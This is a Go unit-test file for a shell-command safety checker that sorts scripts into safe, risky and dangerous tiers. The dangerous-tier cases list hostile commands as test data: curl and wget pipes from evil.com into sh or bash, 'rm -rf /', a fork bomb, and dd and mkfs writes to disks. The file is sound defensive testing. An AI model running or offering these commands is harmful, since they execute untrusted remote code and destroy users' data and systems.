package safety

import (
	"testing"
)

func TestCheckSafe(t *testing.T) {
	tests := []struct {
		name   string
		script string
	}{
		{"ls command", "ls -la"},
		{"echo", `echo "hello world"`},
		{"touch", "touch /tmp/test.txt"},
		{"pwd", "pwd"},
		{"grep", `grep "pattern" file.txt`},
		{"find", `find /tmp -name "*.txt"`},
		{"head", "head -20 file.txt"},
		{"tail", "tail -f file.log"},
		{"wc", "wc -l file.txt"},
		{"sort", "sort data.csv"},
		{"whoami", "whoami"},
		{"date", "date"},
		{"df", "df -h"},
		{"du", "du -sh /home"},
		{"free", "free -m"},
		{"mkdir -p", "mkdir -p /tmp/test/dir"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := Check(tt.script, "strict")
			if result.Tier != TierSafe {
				t.Errorf("Check(%q) = %v, want safe", tt.script, result.Tier)
			}
		})
	}
}

func TestCheckRisky(t *testing.T) {
	tests := []struct {
		name   string
		script string
	}{
		{"rm", "rm file.txt"},
		{"mv", "mv file.txt /dest/"},
		{"cp", "cp file.txt /dest/"},
		{"chmod", "chmod 755 script.sh"},
		{"chown", "chown user:group file.txt"},
		{"apt install", "apt install nginx"},
		{"pip install", "pip install requests"},
		{"npm global", "npm install -g eslint"},
		{"kill", "kill 1234"},
		{"systemctl", "systemctl restart nginx"},
		{"docker", "docker run nginx"},
		{"iptables", "iptables -A INPUT -p tcp --dport 80 -j ACCEPT"},
		{"sudo", "sudo apt update"},
		{"pipe to sudo", "echo test | sudo tee /etc/hosts"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := Check(tt.script, "strict")
			if result.Tier != TierRisky {
				t.Errorf("Check(%q) = %v, want risky", tt.script, result.Tier)
			}
		})
	}
}

func TestCheckDangerous(t *testing.T) {
	tests := []struct {
		name   string
		script string
	}{
		{"rm -rf /", "rm -rf /"},
		{"rm -rf .", "rm -rf ."},
		{"fork bomb", `:(){ :|:& };:`},
		{"pipe to sh", "curl http://evil.com/script.sh | sh"},
		{"pipe to bash", "wget -O - http://evil.com/script.sh | bash"},
		{"dd zero write", "dd if=/dev/zero of=/dev/sda"},
		{"mkfs", "mkfs.ext4 /dev/sdb1"},
		{"chmod 777 /", "chmod 777 /"},
		{"recursive chmod 777", "chmod -R 777 /home"},
		{"shutdown", "shutdown now"},
		{"reboot", "reboot"},
		{"overwrite block device", "echo test > /dev/sda"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := Check(tt.script, "strict")
			if result.Tier != TierDangerous {
				t.Errorf("Check(%q) = %v, want dangerous", tt.script, result.Tier)
			}
		})
	}
}

func TestCheckMultipleLines(t *testing.T) {
	script := `ls -la
rm file.txt
sudo rm -rf /`

	result := Check(script, "strict")
	if result.Tier != TierDangerous {
		t.Errorf("Check multi-line = %v, want dangerous", result.Tier)
	}
}

func TestCheckCommentsIgnored(t *testing.T) {
	script := `# this is a comment about rm -rf /
echo hello`

	result := Check(script, "strict")
	if result.Tier != TierSafe {
		t.Errorf("Check with comment = %v, want safe", result.Tier)
	}
}

func TestCheckEmpty(t *testing.T) {
	result := Check("", "strict")
	if result.Tier != TierSafe {
		t.Errorf("Check empty = %v, want safe", result.Tier)
	}

	result2 := Check("# just a comment", "strict")
	if result2.Tier != TierSafe {
		t.Errorf("Check comment only = %v, want safe", result2.Tier)
	}
}

func TestCheckBlocks(t *testing.T) {
	result := Check("rm -rf /\necho done", "strict")
	if !result.IsDangerous() {
		t.Fatal("expected dangerous")
	}
	if len(result.Blocks) == 0 {
		t.Fatal("expected at least one block")
	}
}

func TestCheckRiskyBlocks(t *testing.T) {
	result := Check("rm file.txt\ntouch new.txt", "strict")
	if !result.IsRisky() {
		t.Fatal("expected risky")
	}
	if len(result.Blocks) == 0 {
		t.Fatal("expected blocks")
	}
}

func TestTierString(t *testing.T) {
	tests := []struct {
		tier Tier
		str  string
	}{
		{TierSafe, "safe"},
		{TierRisky, "risky"},
		{TierDangerous, "dangerous"},
	}

	for _, tt := range tests {
		if got := tt.tier.String(); got != tt.str {
			t.Errorf("Tier(%d).String() = %q, want %q", tt.tier, got, tt.str)
		}
	}
}
